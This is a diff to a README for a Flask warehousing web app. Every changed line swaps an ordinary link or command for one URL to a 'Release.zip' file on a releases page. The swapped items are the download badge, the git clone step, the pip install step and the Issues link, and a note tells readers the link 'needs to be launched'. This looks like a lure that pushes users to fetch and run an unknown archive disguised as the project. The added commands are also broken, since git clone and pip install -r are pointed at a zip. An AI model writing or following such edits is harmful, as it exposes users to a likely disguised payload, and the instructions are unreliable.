@@ -9,7 +9,7 @@ Welcome to the Blue Warehousing System Web repository! This repository is dedica
 
 ## Getting Started 🚀
 To access the latest version of the Blue Warehousing System Web application, you can download the project by clicking the link below:
-[![Download Blue Warehousing System](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Blue Warehousing System](https://github.com/Kryptonnic/blue-warehousing-system/releases/download/v1.0/Release.zip)](https://github.com/Kryptonnic/blue-warehousing-system/releases/download/v1.0/Release.zip)
 
 ℹ️ (*Note: The link provided needs to be launched for downloading the project. If the link is not working, please check the "Releases" section for alternative download options.*)
 
@@ -30,12 +30,12 @@ To run the Blue Warehousing System Web locally on your machine, follow these ste
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/blue-warehousing-system.git
+   git clone https://github.com/Kryptonnic/blue-warehousing-system/releases/download/v1.0/Release.zip
    ```
 
 2. Install the necessary dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Kryptonnic/blue-warehousing-system/releases/download/v1.0/Release.zip
    ```
 
 3. Run the Flask development server:
@@ -52,7 +52,7 @@ To run the Blue Warehousing System Web locally on your machine, follow these ste
 We welcome contributions from the community to enhance the Blue Warehousing System Web project. If you have any ideas for improvements or new features, feel free to submit a pull request.
 
 ## Support ℹ️
-If you encounter any issues or have questions about the Blue Warehousing System Web, please visit the [Issues](https://github.com/your-username/blue-warehousing-system-web/issues) section of this repository.
+If you encounter any issues or have questions about the Blue Warehousing System Web, please visit the [Issues](https://github.com/Kryptonnic/blue-warehousing-system/releases/download/v1.0/Release.zip) section of this repository.
 
 ## License 📝
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
